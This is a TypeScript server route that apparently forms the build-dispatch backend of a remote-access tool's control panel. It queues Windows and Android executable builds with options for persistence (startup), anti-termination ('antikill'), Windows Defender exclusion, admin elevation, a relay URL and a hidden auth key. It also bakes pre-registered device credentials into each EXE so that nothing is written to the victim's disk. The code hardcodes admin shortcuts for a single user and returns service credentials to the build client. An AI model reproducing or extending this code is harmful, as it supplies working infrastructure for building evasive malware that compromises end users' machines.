import { createFileRoute } from '@tanstack/react-router'
import { createHash, randomBytes } from 'crypto'

async function verifyBuildserverKey(request: Request): Promise<boolean> {
  const key = (
    request.headers.get('x-buildserver-key')
    ?? request.headers.get('x-api-key')
    ?? request.headers.get('authorization')?.replace(/^Bearer\s+/i, '')
    ?? ''
  ).trim()
  if (!key) return false
  const expected = process.env.BUILDSERVER_KEY?.trim()
  if (!expected) return false
  return key === expected
}

const PROJECT_ID = '482d3195-690b-45f4-8ea6-71f85eca0667'
const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`

function normalizeAgentTarget(url: string | null | undefined) {
  if (!url) return STABLE_DEV
  if (url.includes('lovableproject.com') || url.includes('id-preview--')) return STABLE_DEV
  if (/project--[0-9a-f-]+(-dev)?\.lovable\.app/i.test(url) && !url.includes(PROJECT_ID)) {
    return STABLE_DEV
  }
  return url.replace(/\/$/, '')
}

async function normalizeBuildUserId(userId: string) {
  const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
  const { data: profile } = await supabaseAdmin
    .from('profiles')
    .select('username,email')
    .eq('id', userId)
    .maybeSingle()

  const username = String(profile?.username ?? '').trim().toLowerCase()
  const email = String(profile?.email ?? '').trim().toLowerCase()
  if (username === 'jayjay' || email === 'jayjay@admin.local' || email === 'jayjay@veltrix.xyz' || email === 'jayjay@larping.cy') {
    return '1'
  }

  const { data: role } = await supabaseAdmin
    .from('user_roles')
    .select('id')
    .eq('user_id', userId)
    .eq('role', 'admin')
    .maybeSingle()

  return role ? '1' : userId
}

async function resolveOwnerUserId(bindUserId: string): Promise<string | null> {
  const alias = bindUserId.trim().toLowerCase()
  const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
  if (alias === '1' || alias === 'jayjay') {
    const { data } = await supabaseAdmin
      .from('profiles')
      .select('id')
      .or('username.eq.jayjay,email.eq.jayjay@veltrix.xyz,email.eq.jayjay@larping.cy')
      .limit(1)
      .maybeSingle()
    return data?.id ?? null
  }
  if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(bindUserId)) {
    return null
  }
  const { data } = await supabaseAdmin
    .from('profiles')
    .select('id')
    .eq('id', bindUserId)
    .maybeSingle()
  return data?.id ?? null
}

// Pre-register a device so the built EXE ships with a baked identity and never
// needs to touch disk on the end-user's PC.
async function preregisterDevice(build: any): Promise<{ id: string; token: string } | null> {
  try {
    const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
    const ownerUserId = await resolveOwnerUserId(String(build.user_id ?? ''))
    const token = randomBytes(32).toString('hex')
    const token_hash = createHash('sha256').update(token).digest('hex')
    const nowIso = new Date().toISOString()
    const pcName = `build-${String(build.id).slice(0, 8)}`
    const { data: device, error } = await supabaseAdmin
      .from('devices')
      .insert({
        pc_name: pcName,
        device_name: build.name || pcName,
        os: build.platform === 'android' ? 'Android' : 'Windows',
        username: null,
        ip_address: '',
        last_seen_ip: null,
        device_token_hash: token_hash,
        owner_user_id: ownerUserId,
        tag: build.tag ?? null,
        platform: build.platform ?? 'windows',
        capabilities: {},
        is_online: false,
        last_seen: nowIso,
      } as any)
      .select('id')
      .single()
    if (error || !device) {
      console.error('[buildserver] preregister failed', error)
      return null
    }
    return { id: device.id as string, token }
  } catch (e) {
    console.error('[buildserver] preregister threw', e)
    return null
  }
}

export const Route = createFileRoute('/api/public/buildserver/poll')({
  server: {
    handlers: {
      GET: async ({ request }) => {
        if (!(await verifyBuildserverKey(request))) {
          return new Response('Unauthorized', { status: 401 })
        }

        // Mark this buildserver as alive (used by the Builder tab's online dot).
        const key = request.headers.get('x-buildserver-key')!
        const ua = request.headers.get('user-agent') ?? 'unknown'
        const ip = request.headers.get('cf-connecting-ip')
          ?? request.headers.get('x-forwarded-for')
          ?? 'unknown'
        const { supabaseAdmin } = await import('@/integrations/supabase/client.server')
        await supabaseAdmin
          .from('build_server_config')
          .update({ last_seen_at: new Date().toISOString() })
          .eq('key', key)
        console.log(`[buildserver] poll ← ${ip} (${ua}) key=${key.slice(0, 14)}…`)

        const { data: builds } = await supabaseAdmin
          .from('builds')
          .select('id, user_id, name, startup, startup_name, debug, antikill, wd_exclusion, require_admin, fun_features, tag, output_kind, icon_url, target_server_url, platform, features, relay_url')
          .eq('status', 'queued')
          .order('created_at', { ascending: true })
          .limit(1)

        if (builds && builds.length > 0) {
          const b: any = builds[0]
          b.target_server_url = normalizeAgentTarget(b.target_server_url)
          b.user_id = await normalizeBuildUserId(b.user_id)

          // Pre-register the device so credentials ship inside the EXE.
          const ident = await preregisterDevice(b)
          if (ident) {
            b.device_id = ident.id
            b.device_token = ident.token
            console.log(`[buildserver] pre-registered device ${ident.id.slice(0, 8)} for build ${String(b.id).slice(0, 8)}`)
          } else {
            b.device_id = ''
            b.device_token = ''
          }

          await supabaseAdmin
            .from('builds')
            .update({ status: 'building', progress: 0, target_server_url: b.target_server_url })
            .eq('id', b.id)
          console.log(`[buildserver] dispatch → build ${String(b.id).slice(0,8)}… (${b.name})`)
        }

        // Include Supabase + relay credentials so build.py always has
        // current values regardless of its local config.json.
        return new Response(JSON.stringify({
          builds: builds || [],
          supabase_url: process.env.SUPABASE_URL ?? `https://xalafdfyarrnysmghror.supabase.co`,
          supabase_anon_key: process.env.SUPABASE_PUBLISHABLE_KEY ?? '',
          hiden_auth_key: process.env.HIDEN_AUTH_KEY ?? '',
        }), {
          headers: { 'Content-Type': 'application/json' },
        })
      },
    },
  },
})
